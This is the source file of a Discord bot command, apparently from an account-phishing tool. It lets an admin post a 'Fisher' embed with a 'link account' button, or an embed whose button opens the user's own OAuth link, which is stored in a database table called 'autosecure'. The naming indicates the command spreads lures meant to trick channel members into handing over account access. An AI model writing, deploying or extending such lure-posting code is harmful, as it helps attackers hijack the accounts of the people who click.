const {
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ApplicationCommandOptionType,
} = require("discord.js");
//const fisherform = require("../../../Utils/fisher/fisherform")
const { queryParams } = require("../../../db/db");
const getEmbed = require("../../utils/getEmbed");
const getButton = require("../../utils/getButton");

module.exports = {
  name: "embed",
  description: "Send your embed",
  options: [
    {
      name: "type",
      description: "The type of the embed to send",
      type: ApplicationCommandOptionType.String,
      required: true,
      choices: [
        {
          name: "Fisher",
          value: "main",
        },
        {
          name: "OAUTH",
          value: "oauth",
        }
      ],
    },
  ],
  adminOnly: true,
  callback: async (client, interaction) => {
    let choice = interaction.options.getString("type");
    if (choice == "main") {
      let embed = await getEmbed(client.username, `main`)
      let button = await getButton(client.username, `link account`)
      try {
        await interaction.channel.send({
          embeds: [embed],
          components: [
            new ActionRowBuilder().addComponents(button)
          ]
        })
        return interaction.reply({ content: `:white_check_mark:`, ephemeral: true })
      } catch (e) {
        console.log(e)
        return interaction.reply({
          content: `Failed to send the message`,
          ephemeral: true
        })
      }
    } else if (choice == "oauth") {
      let oauthLink = await queryParams(`SELECT oauth_link FROM autosecure WHERE user_id=?`, [interaction.user.id])
      if (!oauthLink[0].oauth_link) {
        return interaction.reply({ content: `Set your OAUTH link first!`, ephemeral: true })
      }
      oauthLink = oauthLink[0].oauth_link
      let embed = await getEmbed(client.username, `oauth`)
      let button = await getButton(client.username, `oauth`, { url: oauthLink })

      try {
        interaction.channel.send({
          embeds: [embed],
          components: [
            new ActionRowBuilder().addComponents(button)
          ]
        })
        return interaction.reply({ content: `:white_check_mark:`, ephemeral: true })
      } catch (e) {
        console.log(e)
        return interaction.reply({
          content: `Failed to send the message`,
          ephemeral: true
        })
      }
    } else {
      return interaction.reply({ content: `Invalid Choice!`, ephemeral: true })
    }
  },
};
